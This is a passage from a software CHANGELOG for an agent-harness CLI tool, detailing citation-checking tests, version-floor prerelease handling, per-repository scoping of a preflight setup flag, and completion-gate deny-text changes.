own `stdout(` call: `3330-3391#"stdout("` (`pause`) and `3395-3427#"stdout("` (`resume`). Also added in round 2: the ratchet's collection loop is now `collectBareNonMd(dir, labelPrefix)`, fixtured directly over a scratch docs/okf-shaped temp directory (a planted non-log bare citation is collected, a planted log.md one is not), closing a gap where widening the log.md exemption to every doc previously survived the whole suite; and a new anchor-quality guard asserts every anchored docs/okf citation's anchor contains at least one word character, so a punctuation-only anchor fails outright regardless of what class of citation introduces one next. **Round 3 (task `898f9925` round 3, decision D-031)** also extends the anchor-quality guard's `hasWordCharacterAnchor` predicate over `docs/decisions` (0 offenders there, measured 2026-09-09), adds the guard to the test file's header comment, and corrects `docs/okf/index.md`'s Maintenance section, which had described the bare-citation ratchet's test title as reporting "a computed count" in general when only `log.md`'s title interpolates a number (the outside-`log.md` count is asserted at zero, not reported).

- **`tests/decisions-citations-resolve.test.ts` now also blocks on a whitespace-padded docs/okf anchor** (task `98025e15`). Task `898f9925`'s round 2 anchor-quality guard (`hasWordCharacterAnchor`) accepted `pause-vs-gate-kill-switch.md:37`'s `docs/for-humans.md:395-397#"  diff-able, source-controlled."` anchor, whose uniqueness rested on two leading spaces rather than on a word the doc's own sentence names: a reformat of `for-humans.md` could silently trim that indentation and turn a routine reflow into a confusing guard failure instead of a clear re-anchoring prompt. Re-anchored on `#"source-controlled"`, unique on the cited end line without depending on whitespace; the historical narration at `docs/okf/log.md:1602` is left as-is. A new `hasWhitespacePaddedAnchor` predicate (mirroring `hasWordCharacterAnchor`'s pattern) and describe block, at the end of the test file, assert no anchored docs/okf citation's anchor starts or ends with whitespace, fixtured directly (a padded-anchor fixture fails, an unpadded one passes) and over a planted scratch docs/okf directory, so a neutralised predicate is caught independent of the live bundle's anchors. `docs/okf/index.md`'s Maintenance section names the rule as point (4).

- **`tests/decisions-citations-resolve.test.ts` now blocks on `docs/okf`'s heading-section (`path.md:#heading`) citations, not just its `path:N[-M]` ones** (task `ee494719`). Tasks `419ecfad` and `4f0abbc8` replaced `CHANGELOG.md` frontmatter `sources:` entries on five bundle docs with inline `` `CHANGELOG.md:#0.x.y` `` heading-section citations pointing at the `[0.24.0]`, `[0.35.0]`, `[0.39.0]`, `[0.43.0]`, `[0.44.0]`, `[0.45.0]`, and `[0.48.0]` release sections, resolved only by okf-kit's warn-only `citations-resolve` rule (the `okf-staleness` CI job), so a renamed or removed `## [x.y.z]` release section only warned, never blocked. A new guard, mirroring okf-kit@0.10.0's heading-form semantics (`src/rules/citations-resolve.ts`'s `HEADING_SECTION_CITATION_RE` / `findHeadingSection` / `checkHeadingSectionTarget`, the version this repo's `okf-staleness` CI job pins), extracts every `path.md:#heading` citation in `docs/okf`, resolves it against the target's own Markdown heading structure (level <= 2, fence-aware), and, for a `CHANGELOG.md` target specifically, additionally requires the matching heading to take this repo's exact `## [x.y.z]` bracket form. It also extracts and checks the optional content-anchor form, `path.md:#heading#"text"`, requiring the quoted text to occur on exactly one line inside the resolved heading's section. `docs/okf/index.md`'s Maintenance section names this coverage and its one deliberate scope cut from okf-kit: path resolution here is repo-root-relative only, not okf-kit's fuller sources/doc-relative/ancestor/repo-wide resolution chain.
  - Pinned by fixture tests (isolated temp `CHANGELOG.md`, not the real one): a citation to a version with no heading at all (only present in prose) fails; a citation to a heading naming the version but not in the exact `## [x.y.z]` form fails; a citation whose only matching heading sits inside a fenced code block fails (discriminates a mutant that stops excluding fenced lines from heading matching); a citation to a version present only as a level-3+ heading fails (discriminates a mutant that raises the level-2 cap); a citation matching two level-2 headings fails as ambiguous (discriminates a mutant that drops the ambiguity check); a content-anchored citation resolves when its quoted text occurs once in the section and fails when it does not (discriminates a mutant that skips the content-anchor check); and a `citedPath` containing a `..` segment is rejected outright without resolution. A sibling negative-grammar fixture pins `HEADING_CITATION_RE` itself against loosening (an unbackticked heading-shaped path in prose, a Markdown link fragment, and a non-`.md` path must all extract zero citations).
  - **Follow-up (task `9fec3839`): the guard now also mirrors okf-kit's `heading-section-empty` check.** A resolved heading whose section body (from the line right after the heading up to, but not including, the next heading at or above the same level, or EOF) has no non-blank content previously resolved cleanly here even though okf-kit's warn-only `citations-resolve` rule would flag it; the guard's `checkHeadingCitation` now runs the same emptiness check (`isHeadingSectionEmpty`, mirroring okf-kit's `isSectionEmpty`) before the content-anchor check, in the same order upstream does. Pinned by a fixture pair (an empty `## [1.2.9]` section that fails with "no non-blank content", and a non-empty `## [1.2.10]` control that resolves cleanly), both directions probed via `agent-primitives probe`.

### Changed

- **`harness doctor`'s second, project-scoped load and the `session_start_preflight` producer now share one `resolveScopedProjectName` helper instead of two independently written copies of `opts.project ?? deriveProjectName(cwd) ?? fallback`** (task `f1eb1c5c`). Nothing pinned that the two copies stayed identical: `doctor` (`src/cli/doctor/index.ts`) used `?? null`, the producer (`src/cli/session-start/index.ts`) used `?? repo`. Reproducing the three real-git shapes (a normal repo, a linked worktree, a cwd outside any git work tree) confirmed the two surfaces already agreed on the first two terms (an explicit `--project`, then the cwd-derived name) in every case both surfaces actually reach; the fallback is the only place they differ, and outside a git work tree the producer never even evaluates the expression (it returns earlier, once `resolveGitContext(cwd).repo === ""`). `resolveScopedProjectName<T>({ project, cwd, fallback: T })` (`src/runtime/git-context.ts`, exported from `src/runtime/index.js`) now names that fallback as an explicit, visible argument at each call site rather than an accident of copy-paste drift; no observable behaviour change at either call site other than doctor's `cwd` expression (`opts.cwd ?? process.cwd()`) now being evaluated eagerly as an argument, instead of lazily inside the old inline `??` chain. `harness explain-policy` (`src/cli/explain-policy.ts`) has its own third copy of the same expression and is intentionally left alone here (out of this task's scope).
  - Pinned by new tests at the end of `tests/runtime/git-context.test.ts` ("resolveScopedProjectName"): both surfaces' fallback resolve to the same derived name in a normal repo and in a linked worktree, an explicit `project` wins outright without deriving anything, and each surface's own `fallback` value comes through unmodified (and differs by design) outside a git work tree.
  - **Follow-up (task `2dadec9d`, batch-46 follow-up): the round-2 divergence pin's `vi.mock("node:fs", ...)` is now scoped to its own file.** That pin (added in `tests/cli/doctor-session-start-preflight-setup-version.test.ts` to spy on `fs.existsSync`'s call history) needed a file-wide mock, since a plain `vi.spyOn(fs, "existsSync")` fails under ESM; `vi.mock` is hoisted and file-scoped in vitest, so it cannot be cleared per-test with `afterEach`, and it was leaking into every OTHER case in that shared file. The pin, and a new negative control asserting doctor DOES probe `fs.existsSync` under `<home>/projects/` for a genuinely valid cwd-derived project name, now live in a new sibling file, `tests/cli/doctor-session-start-preflight-setup-version-divergence.test.ts`; the original file no longer mocks `node:fs` at all. Both the relocated pin's fixture and the new negative control's fixture now assert their own preconditions explicitly (`findGitEntry`/`deriveProjectName` from `src/runtime/git-context.ts`) before exercising `doctor()`, rather than relying on the fixture's directory shape alone. Probed via `agent-primitives probe` with the mutant `fallback: null` -> `fallback: "drifted-fallback"` at doctor's `resolveScopedProjectName` call site (`src/cli/doctor/index.ts`; doctor's pre-`f1eb1c5c` fallback was `?? null`, the `?? repo` form was the producer's), both before and after the split: the relocated pin still fails under that mutant in both layouts. The review additionally probed the literal `?? repo` shape at the shared resolver itself (`src/runtime/git-context.ts`); the relocated pin kills it too.

- **All five previously prerelease-blind `min_version` floor checks now reject a prerelease at an equal-numeric floor, closing the boundary task `65952a0c` left open** (task `db44ab46`, decision `docs/decisions/2026-09-08-preflight-floors.md`'s "Update" section). `tools.cli[]` and `tools.mcp[]` in `harness doctor` (`checkCli`/`checkMcpVersions`, `src/cli/doctor/index.ts`), `tools.cli[]` in `harness validate` (`src/cli/validate/checks.ts`), `memory.router`'s version floor (`src/probes/memory.ts`), and policy-pack-level floors (`src/policy-packs/version-check.ts`) now all use `parseProbedVersion`/`compareVersionFloor` from `src/io/version-compare.ts`, the same pair `checkHookVersion` and `checkSessionStartPreflightSetupVersion` already used: a probed `1.2.3-rc.1` reads `below_floor` against an equal `1.2.3` floor on every `min_version` check in this codebase now, not only `hooks[]`. Who pays: an operator running a release candidate of any of these five tools now sees a below-floor diagnostic until the release ships, and severity differs by surface: `tools.cli[]` in both `harness doctor` (`checkCli`) and `harness validate` pushes `error` (counted into that command's `errorCount`, a hard failure), `tools.mcp[]` in `harness doctor` and `memory.router`'s version probe push `warn`, and the policy-pack floor's `below_floor` gap is counted into `harness doctor`'s `warningCount` the same way, the same footing as `tools.mcp[]` and `memory.router`, not a hard failure; this is correct under semver precedence, not a regression; maintainers keep one comparator. The now-dead `compareVersions` alias and its `compareNumericVersions` import are removed from `src/cli/doctor/index.ts`; the unused `SEMVER_RE` regex is removed from `src/cli/validate/checks.ts`. `docs/CLI.md`'s VERSION CAVEAT prerelease-handling and accepted-cost sentences are generalised from `hooks[]`-only to every `min_version` floor check.
  - Pinned by new tests, one per surface (dotted `-rc.1` and dotless `-beta` prerelease cases, a real-release no-regression case, a higher-version-prerelease case where the numeric comparison is not a tie, and git-describe and platform-suffix cases at an equal-numeric floor): `tests/cli/doctor.test.ts` (two new describe blocks, `tools.cli[]` and `tools.mcp[]`), `tests/cli/validate.test.ts`, `tests/probes/memory.test.ts`, `tests/policy-packs/version-check.test.ts`, plus a direct unit-level `tests/io/version-compare.test.ts` for `parseProbedVersion`/`compareVersionFloor` themselves.
  - **Two residuals from that entry's round-3 review, closed by task `62d9778c`.** First, `docs/CLI.md`'s claim that a `+build` metadata suffix is not a prerelease under this rule was covered only by the `parseProbedVersion` unit test in `tests/io/version-compare.test.ts`; a surface-level regression (a comparator bypassing `parseProbedVersion`) would not have been caught. A `+build` case asserting `ok` at an equal-numeric floor is now pinned at the end of each surface's own test file too: `tests/cli/doctor.test.ts` (`tools.cli[]` and `tools.mcp[]`), `tests/cli/validate.test.ts` (`tools.cli[]`), `tests/probes/memory.test.ts` (`memory.router`), `tests/policy-packs/version-check.test.ts` (the pack-level floor). Second, the "who pays" claim above that a pack-level `below_floor` gap is counted into `harness doctor`'s `warningCount` and leaves `errorCount` untouched rested on prose alone (`countDiagnostics`, `src/cli/doctor/index.ts`); a new report-level test in `tests/cli/doctor.test.ts` ("pack-level below_floor gap report-level counts") compares a floor met against a floor missed, pinning that the gap count and `warningCount` move together by the same amount while `errorCount` does not move, so a mutant reclassifying the gap into `errorCount` fails it. No behaviour change; test-only.

- **Split the shared `agent-preflight` version floor into a hook floor and a setup floor; a probed prerelease now fails the floor** (task `65952a0c`, residual of task `6993d9b5`'s round-2 review; decision `docs/decisions/2026-09-08-preflight-floors.md`). Through task `6993d9b5`, ONE constant (`SESSION_START_PREFLIGHT_SETUP_BUILD_MIN_VERSION`) fed both `harness doctor`'s `session_start_preflight.setup` advisory and `FULL_TEMPLATE`'s `git-preflight` hook `min_version`, so a future bump to either would move the other, even for an operator who never enables `setup`. Now two independent constants: `GIT_PREFLIGHT_HOOK_MIN_VERSION` (`src/cli/init/templates.ts`, the hook floor; also read by `src/cli/init/dependencies.ts`'s wizard-facing `preflight` dependency table) and `SESSION_START_PREFLIGHT_SETUP_BUILD_MIN_VERSION` (`src/schema/session-start-preflight.ts`, the setup floor). Both are `"0.6.0"` today, so a freshly generated manifest warns exactly as before; each carries its own bump rule in the ADR and is pinned to its consumer by a SOURCE-identity test (not only a value comparison, since the two constants share a value today and a value-only assertion cannot discriminate a swap between them).
  - **Prerelease handling.** Both floor checks (`checkHookVersion`, generic across every `hooks[]` entry declaring `min_version`, and `checkSessionStartPreflightSetupVersion`) previously extracted a probed version with `/(\d+(?:\.\d+){0,3})/`, matching only the leading numeric run: `preflight 0.6.0-rc.1` parsed to `0.6.0` and silently passed a `0.6.0` floor, even though 0.6.0-rc.1 does not carry the build step the floor exists to guarantee. A new shared pair in `src/io/version-compare.ts`, `parseProbedVersion` (also captures whether a `-` prerelease/build suffix followed the numeric run) and `compareVersionFloor` (treats a prerelease `actual` as strictly below an equal-numeric floor, matching semver precedence), fixes this ONCE for both consumers. Scope note: this also changes behaviour for every OTHER `hooks[]` entry with `min_version` (`checkHookVersion` is shared code), an intentional, documented cross-consumer effect; the boundary is `hooks[]` only, for now: it does NOT extend to the other five prerelease-blind `min_version` floor checks in this codebase, which all keep their pre-existing raw-regex extraction and `compareNumericVersions` comparison unchanged: `tools.cli[]` and `tools.mcp[]` in `harness doctor` (`src/cli/doctor/index.ts`), `tools.cli[]` in `harness validate` (`src/cli/validate/checks.ts`), `memory.router`'s version floor (`src/probes/memory.ts`), and policy-pack-level floors (`src/policy-packs/version-check.ts`). See the ADR's scope note for the accepted-cost consequence (one `harness doctor` run can reject a probed prerelease for a `hooks[]` entry while accepting the identical string for `tools.mcp[]`, `memory.router`, or a `policy_packs[]` floor). Superseded by task `db44ab46`: see the entry above, the boundary is now closed.
  - Pinned by new tests: `tests/cli/init-full-template-pins.test.ts` and `tests/cli/init-dependencies.test.ts` gain source-identity assertions (reading the actual `templates.ts`/`dependencies.ts` source text) that fail if either consumer is wired to the wrong constant; `tests/cli/doctor-session-start-preflight-setup-version.test.ts` gains the same for the setup check's `const required =` line, plus a `0.6.0-rc.1` below_floor case; `tests/cli/doctor.test.ts` gains a `0.6.0-rc.1` below_floor case for the generic hooks[] check.

- **`session_start_preflight.setup` is now scoped per repository** (task `c88461c1`), the follow-up docs/CLI.md named against task 30183330. Previously the key was resolved from the base manifest plus machine-override layers only: the generated `git-preflight` SessionStart hook invokes `harness session-start preflight` with no `--project`, so `src/cli/loader.ts`'s `resolvePaths` never consulted a project layer on that path (pinned by `tests/cli/loader-project-layer.test.ts`, from task 30183330's review round 3), and a hardcoded `--project` in the hook would have named one project for every repository. The producer (`src/cli/session-start/index.ts`) now derives a project name from its own cwd and feeds it through the loader's EXISTING `LoaderOptions.project` mechanism, the same seam every other command's own `--project <name>` flag already uses; an explicit `--project` still wins outright, and a repo with no matching `<home>/projects/<name>/harness.overrides.yaml` on disk keeps the host-wide value unchanged (no error, no warning). `harness explain-policy` now also names which resolved layer (`base`, `machine`, or `project`) decided the value for `preflight-before-*` policies. `docs/CLI.md`'s Notes and `src/schema/session-start-preflight.ts`'s header are rewritten to describe the new rule; the loader's own project-layer contract (`resolvePaths`/`loadManifest` require an explicit `LoaderOptions.project`) is unchanged and still guards every other command that flag serves.
  - Pinned by new tests in `tests/cli/session-start/preflight.test.ts` ("per-repo scoping via cwd-derived project name"): a project layer flips `setup` in either direction against an opposite base value, an explicit `--project` overrides the cwd-derived name, and a cwd with no matching project layer keeps the base value. `tests/cli/loader-project-layer.test.ts`'s existing loader-level assertions (no project layer resolves without `LoaderOptions.project`) are updated in comment only, not deleted: they still pin the shared primitive the new cwd derivation feeds into. `tests/cli/explain-policy.test.ts` gains coverage for `session_start_preflight.source` across all three layers.
  - **Review round 2 fixes** (task `c88461c1`). Round 1 shipped two HIGHs, one MEDIUM, and one LOW.
    - **HIGH, decision D-021a: repository identity is the MAIN checkout, not the checkout directory.** Round 1 derived the project name from the cwd's own work-tree basename (`resolveGitContext(cwd).repo`), which differs per linked worktree of the same repository, two worktrees of one repo resolved two different project layers. `deriveProjectName` (new, `src/runtime/git-context.ts`) instead resolves the basename of the directory CONTAINING the repository's shared git common dir (reusing the existing `resolveCommonDir`), so every linked worktree of one repository shares the identical project layer; a bare repository (no `.git` wrapper) applies its own directory's basename directly, with no extra step up. The `preflight:${REPO}` ledger tag keeps using `resolveGitContext`'s `repo` unchanged (an unrelated, out-of-scope design choice). Pinned by new tests in `tests/runtime/git-context.test.ts` (`deriveProjectName`: main checkout, linked worktree resolving the main checkout's name and not its own, a linked worktree of a bare repository) and `tests/cli/session-start/preflight.test.ts` (a linked-worktree fixture driving the producer end to end, both merge directions, plus the "not named after the worktree's own directory" negative case).
    - **HIGH, decision D-021b: `explain-policy` and `doctor` now derive the same project name the producer does.** Round 1 wired the cwd-derivation into the producer only; `harness explain-policy` and `harness doctor` still read `LoaderOptions.project` from an explicit `--project` alone, so both could report the base/machine value for a cwd where the producer was actually reading a project layer, reproduced during round-2 review (`explain-policy` printed `source: base` / `setup: false` in the same cwd the producer read `setup: true` from a project layer; `doctor`'s version-floor check warned/stayed-silent against the pre-layer value). Both verbs now call the shared `deriveProjectName` helper the same way the producer does, feeding `opts.cwd ?? process.cwd()` through when `opts.project` is absent. Pinned by new tests in `tests/cli/explain-policy.test.ts` ("source:project from a cwd-derived project name, with no explicit --project") and `tests/cli/doctor-session-start-preflight-setup-version.test.ts` ("session_start_preflight per-repo effective value"), both directions.
    - **MEDIUM: three stale docs/tests still asserted the pre-c88461c1 "HOST-WIDE, no per-repo scoping" claim** task 30183330 shipped, now superseded by the entry above: `tests/cli/init-preflight-hook-project-scope.test.ts`'s header comment, `tests/cli/loader-project-layer.test.ts`'s inline "documented host-wide scope claim" comment, and this CHANGELOG's own task-`30183330` bullets below (now cross-referenced with a "superseded" pointer rather than left silently contradicting the entry above).
    - **LOW: a tombstone (`session_start_preflight: null` or `{setup: null}`) was attributed to the wrong layer in `explain-policy`'s `source`.** `layerDeclaresSetup` only recognized a literal boolean; a layer that instead deletes a lower layer's value (honoured by `mergeValue`, `src/overrides/merge.ts`, as "fall back to the schema default") is just as much a declaration by THAT layer, so attributing it to whichever lower layer happens to also set a boolean named the wrong layer as the decision-maker. Now "declared" means key presence (the `session_start_preflight` key present at all, or `setup` present under it, regardless of value). Pinned by a new test in `tests/cli/explain-policy.test.ts` ("attributes a project layer's tombstone... as source:project, not the machine layer underneath it").
  - **Review round 3 fixes** (task `c88461c1`). Round 2 shipped one HIGH, one MEDIUM (security), one MEDIUM (docs), and two LOWs.
    - **HIGH, decision D-028: the derived project layer is now scoped to `session_start_preflight.setup` alone, everywhere it is read.** Round 2's `explain-policy`/`doctor` fix (decision D-021b, above) fed the cwd-derived project into their FULL `loadManifest` call, so every OTHER key (policies, triggers, hooks, risk) was also resolved through that project layer, while the enforcement path (`harness policy intercept`, `src/cli/policy/intercept.ts`; `harness dry-run`, `src/cli/dry-run.ts`) still read the manifest plain. Reproduced: a project layer overriding a policy trigger's `bash_match` flipped `explain-policy`'s `matched` verdict while `policy intercept` in the same cwd reported no match, and `doctor --shallow --json`'s exit code could diverge from a base-manifest-only run for reasons unrelated to `session_start_preflight`. Both verbs now do TWO loads: a PLAIN `loadManifest(opts)` (explicit `--project` only, as before round 2) feeds everything else they check, and a SECOND, project-scoped load feeds only `session_start_preflight.setup` (and, for `explain-policy`, `source`); a config/parse failure on the second load degrades to the plain load's own value (the round-3 reviewer noted this is not the producer's own fallback, whose `setupEnabled` catch degrades to `setup: false`; aligning the two and pinning it with a test is filed as a follow-up). `docs/CLI.md`'s "cannot silently disagree" sentence is rewritten to name the boundary: the three producers agree only on `session_start_preflight.setup`'s per-repo effective value, never on the full manifest a policy is evaluated against. Pinned by new tests in `tests/cli/explain-policy.test.ts` ("the derived project layer never reaches policy evaluation") and `tests/cli/doctor-session-start-preflight-setup-version.test.ts` ("the derived project layer never reaches any OTHER check"), each driving a project layer that changes a non-setup key and asserting the enforcement-relevant verdict/report is unaffected; a machine-layer-precedence-beneath-a-non-declaring-project-layer test is added alongside the existing per-layer `source` coverage.
    - **MEDIUM (security): an unvalidated derived name could reach `resolvePaths`' `path.join` with a directory-traversal shape.** `resolveCommonDir` (`src/runtime/git-context.ts`) returned an absolute `commondir` value verbatim, unresolved `..` segments and all; a crafted `.git` FILE plus a private gitdir whose `commondir` file held such a value could make `deriveProjectName`'s final `path.basename` call textually return `".."` instead of the intended ancestor directory's real name. `resolveCommonDir` now `path.normalize`s its absolute branch (the relative branch already normalized via `path.resolve`), and `deriveProjectName` additionally rejects (returns `null` for) the empty string, `"."`, `".."`, and any name containing a forward slash, a backslash, or a NUL byte, on both its main resolution path and its unreadable-`.git`-FILE fallback. Pinned by new tests in `tests/runtime/git-context.test.ts`: a hand-built crafted-`commondir` fixture (pre-fix would have derived `".."`; post-fix derives the real main-checkout name) and a POSIX directory literally named with an embedded backslash (rejected, `null`).
    - **MEDIUM (docs, repeated from round 1): two more stale docs/tests still described the pre-round-2 derivation.** `tests/cli/session-start/preflight.test.ts`'s "per-repo scoping" test comment still said the producer derives its project name "via `resolveGitContext`"; it names `deriveProjectName` (the MAIN-checkout rule) instead. `tests/cli/loader-project-layer.test.ts`'s describe title still read as a host-wide "no scoping without `--project`" claim, now superseded by three producers deriving `opts.project` themselves; reworded to name that this file pins the loader primitive only, not whether a caller derives into it.
    - **LOW (docs): two more real-git shapes pinned.** `deriveProjectName`'s doc comment and `docs/CLI.md`'s REPOSITORY IDENTITY paragraph now name that a submodule checkout (`git submodule add`) derives the submodule's OWN name (its private gitdir has no `commondir` file, that mechanism is linked-worktree-only) and a `git init --separate-git-dir=<dir>` checkout derives `<dir>`'s own basename, never the work tree's, for the same reason. Pinned by two new tests in `tests/runtime/git-context.test.ts` driving real `git submodule add -c protocol.file.allow=always` and `git init --separate-git-dir=` fixtures.
    - **LOW: a stray space before a comma in two comments** (`src/cli/session-start/index.ts`, `tests/cli/explain-policy.test.ts`), left over from the orchestrator's em-dash sweep. Fixed.
  - **MIGRATION NOTE (tracker `52c0036f`): rename a project layer directory that no longer resolves because its name is not the canonical basename of the repository's real directory; the two cases below say exactly when.** Both situations below were measured against the built CLI with `harness explain-policy <a preflight-before-* policy> --event <event.json> --json`, reading `session_start_preflight.source` for one layer directory at a time against a repository directory `MyRepo`, a symlink `linkrepo -> MyRepo`, and a differently-cased path to that same directory, each read from all three of those access paths.
    - **SYMLINK: rename a layer directory keyed on a symlink's own name to the real directory's basename.** After the rename, `harness explain-policy <a preflight-before-* policy> --event <event.json> --json` reports `session_start_preflight.source: "project"` for that repository. Why: the layer is keyed on `deriveProjectName`'s output, the basename of the realpath-resolved directory holding the repository's shared git common dir (the symlink-resolution entry below), so a layer at `<home>/projects/linkrepo/harness.overrides.yaml` never matches. Measured: with that layer in place `source` read `"base"` from the real path, from the symlink and from a differently-cased path alike; with `<home>/projects/MyRepo` instead it read `"project"` from all three.
    - **CASING: rename a differently-cased LAYER DIRECTORY to the canonical on-disk basename when `HARNESS_HOME` sits on a case-sensitive filesystem; on a case-insensitive one it keeps resolving and needs no change. A differently-cased ACCESS PATH carries no rename instruction at all.** Why: `deriveProjectName` does not correct casing (Node's default `fs.realpathSync`; unchanged by this release), so the layer lookup is exactly as forgiving as the filesystem `HARNESS_HOME` itself lives on. Measured with a layer directory `myrepo` against the derived name `MyRepo`: on a case-insensitive home `source` read `"project"` from all three access paths; on a case-sensitive home the same layer read `"base"` from all three, and the fix there is the same rename as the symlink case. The access path is a separate axis and reaches almost nothing: `process.cwd()` was the canonical `.../MyRepo` from the real path, the symlink and the differently-cased path alike, so every CLI verb derives from the canonical spelling, and only the SessionStart hook's raw event `cwd` can still carry the spelling a caller typed.
...
- **`solution-acceptance`'s reconnect-vs-retry guidance now reaches the agent, not only the operator's audit copy** (task `5c9cad05-bc13-49ad-80e5-8273742f2789`). `instructions.md` (above) is rendered once and never re-read by the agent mid-session, so nothing surfaced the guidance at the moment it is actually needed: the completion-gate denying a completion verb with no ready verdict on record. A pack MEMORY.md contribution was considered and rejected: `PackContribution` (`src/policy-packs/types.ts`) carries `hooks`, `files` and an optional `permissions` contribution, none of which reaches the generated MEMORY.md, and `generate-memory-index.ts` builds `MEMORY.md` solely from user-authored files under `manifest.memory.directories[]`, packs have no contribution path into it today, and adding one is out of scope here. The completion-gate's deny text (`harness pack hook solution-acceptance`, `blockJson` in `src/cli/pack/hook-solution-acceptance.ts`) is the surface instead: it fires exactly when the agent needs this. The guidance is gated on `gate.verdict === null` (`evaluateGate`'s "no solution-acceptance verdict recorded" branch): this hook does not read the documented attempt-lock anchor (scope decision, see the follow-up below), so it names all three readings the condition covers, "never evaluated", "an attempt is still running in the background", and "a marker exists but could not be read or parsed", and the same deny carries the facts an agent needs either way: reconnect with `solution_evaluate_status` / `solution_evaluate_result` by `attemptId` (or the latest attempt when omitted); never retry `solution_evaluate` while the id's lock is held (a second call for a live attempt just joins it and returns its `attemptId`, never starting a second `preflight` run; only `forceNewAttempt` is refused while that lock holds); the poll interval and retention bounds verified against the released grounding-mcp v0.11.0 README (`pollAfterMs` advertised as `5000`, retention 24h by default and always at least 100x `pollAfterMs`, a pruned terminal attempt reads `expired`). The guidance does not appear on a not-ready or stale verdict deny (both mean a run already completed, no in-flight ambiguity there), when no verdict id resolved at all, on the manifest-load-failure failsafe deny, or when an operator's custom `ux` block replaces the default deny text. `instructions.md` stays the audit copy (see "Review round 3 redesign" below for how it now renders). grounding-mcp's README also documents an attempt-lock anchor (`<verdict dir>/<id>.attempt-lock`, beside the `<id>.attempt-lock.lock` directory `proper-lockfile` manages) the hook could read to narrow this to just the in-flight case; reading it is a follow-up, not this change, since it is a second cross-repo coupling to the producer's lock-file layout with its own stale-lock semantics to absorb. See `docs/policy-packs/solution-acceptance.md`, "Agent-facing surface for the in-flight case (decision, harness/5c9cad05)", for the full decision record.
  - **Review round 1 fixes** (task `5c9cad05`, the branch's round-2 commits; the commit messages name the task id, so this entry covers them across rebases). The deny text had wrongly claimed a live attempt's lock "refuses a second `solution_evaluate` call"; grounding-mcp's actual semantics are that a second call for a live attempt JOINS it (only `forceNewAttempt` is refused), corrected in both the deny text and this doc. The code comment and doc subsection had also overclaimed that no in-flight signal exists at all; both now say the hook does not read the documented attempt-lock anchor (scope decision, see the follow-up), naming all three `gate.verdict === null` readings instead. "No verdict marker on record" is now "no readable verdict marker" throughout, since `gate.verdict === null` also covers a marker that exists but failed to parse.
  - **Review round 3 redesign, fixing the round-2 findings** (task `5c9cad05`; docs/okf/log.md uses the same round numbering). The recurring review class across rounds 1-2 was hand-written deny text asserting producer semantics that drift from `instructions.md` and the source, so this round moves the reconnect-vs-retry facts into one shared module, `src/policy-packs/builtin/solution-acceptance-reconnect.ts`: both the deny paragraph (`renderReconnectDenyParagraph`) and the `instructions.md` section (`renderReconnectInstructionsSection`) now render from the SAME exported fact constants, qualified throughout with `RECONNECT_VERSION_QUALIFIER` ("With grounding-mcp >= 0.11.0:") rather than asserted as if the pack's own (older) producer floor (>= 0.3.2) guaranteed it. `tests/policy-packs/solution-acceptance-reconnect.test.ts` asserts every fact constant appears verbatim in both rendered surfaces, so a future edit to one surface that forgets the other fails that test. `docs/policy-packs/solution-acceptance.md` says `PackContribution` carries "hooks, files and an optional permissions contribution, none of which reaches the generated MEMORY.md" (it has three fields, not two, `src/policy-packs/types.ts`).
  - Pinned by `tests/cli/pack-hook-solution-acceptance.test.ts`: the no-verdict deny test ("the no-verdict deny carries the reconnect-vs-retry facts...") asserts the tool names, the `attemptId`/no-retry/`joins`/`forceNewAttempt` sentence, and the `pollAfterMs`/`5000ms`/`24h`/`100x pollAfterMs` numbers; the not-ready, stale, no-verdict-id, and (new, review round 2) manifest-load-failure deny tests all assert the guidance is absent there.
  - **Rendering polish** (task `04189542-266d-4607-a764-9c2e4f752dfb`, commits `1f9335e` and `3fccde4`, PR #533): shared facts now own the backticked identifiers and explicit verdict-id placeholder, while each renderer owns its lead-in. The focused parity test pins both rendered surfaces, the resolved verdict id, the single retention-floor identifier, and line wrapping.

### Added

- **`harness session-start preflight` (and its `harness preflight` alias) can pass `--setup` through to the `preflight run` invocation it spawns** (task `30183330`). New opt-in manifest key `session_start_preflight.setup` (default `false`, `.strict()`; `src/schema/session-start-preflight.ts`), where an absent `session_start_preflight:` block and an explicit `setup: false` block behave identically, matching every other SessionStart companion's opt-in convention (`toolchain_parity`, `stale_base_check`). Motivation: agent-preflight's build-required test classification (agent-preflight PR #72) exists only because this companion ran `preflight run --json <cwd>` with no `--setup`, so a fresh npm-workspaces monorepo checkout (dependencies installed, nothing built yet) always hit the named "build required before test" skip on its root `npm test`; the producer now stops manufacturing that failure once an operator opts in. The build step itself is on the UNRELEASED agent-preflight build this schema was authored against (commit `f339b062381c0c06b29f5381e9aaf2f78d135151`, npm-linked locally); the released `@lannguyensi/agent-preflight@0.5.0`'s `--setup` is dependency-install only, no build step, so this knob has no visible effect against that release beyond the (harmless) install. The whole `preflight run` child, with or without `--setup`, stays bounded by the SAME `--timeout` / `preflightTimeoutMs` this producer already accepts (`DEFAULT_PREFLIGHT_TIMEOUT_MS`, 60000ms, `src/cli/session-start/index.ts`), enabling `setup` on a workspace whose install+build routinely runs long should come with an explicit `--timeout` raise; neither the schema nor the producer ever raises it automatically; `harness explain-policy` now shows the resolved `session_start_preflight.setup` value for `preflight-before-*` policies. The HEAD-sha resolution `preflight-before-push`'s `at_head` gate relies on is unchanged: it is still captured before `runPreflight` is invoked, pinned by a new regression test that mutates the loose ref DURING an injected `runPreflight` call and asserts the recorded `head:<sha>` is the value from before that call, not after.
  - Measured wall time: against agent-preflight's own zero-dependency `tests/fixtures/monorepo-build-required` fixture (an npm-workspaces repo with one unbuilt workspace and a `ci.yml` build-before-test step), the root `npm-test` check goes from the named `skip` (no `--setup`, ~0.43s total wall time) to `pass` (`--setup`, ~0.60s total wall time). Neither `agent-ops-dashboard` nor `project-pilot` (the two candidate real fleet monorepos) actually reproduces the named skip: `project-pilot`'s root `package.json` has no top-level `test` script (only per-workspace `test:coverage`), so agent-preflight's Node test check never runs there at all; `agent-ops-dashboard`'s workspace tests already pass without a build (they do not import their own `dist/`). Run against a fully fresh `agent-ops-dashboard` worktree (no `node_modules` at all) instead, for a realistic order-of-magnitude on `--setup`'s added cost on a real monorepo: ~0.85s total without `--setup` (the Node test check is skipped outright there too, for the DIFFERENT reason that no test runner is installed yet) versus ~17.9s total with `--setup` (`npm ci` plus a conditional `npm run build`); `--setup`'s own added wall time is dependency-install-and-build bound and scales with the target workspace, not with this companion's own logic.
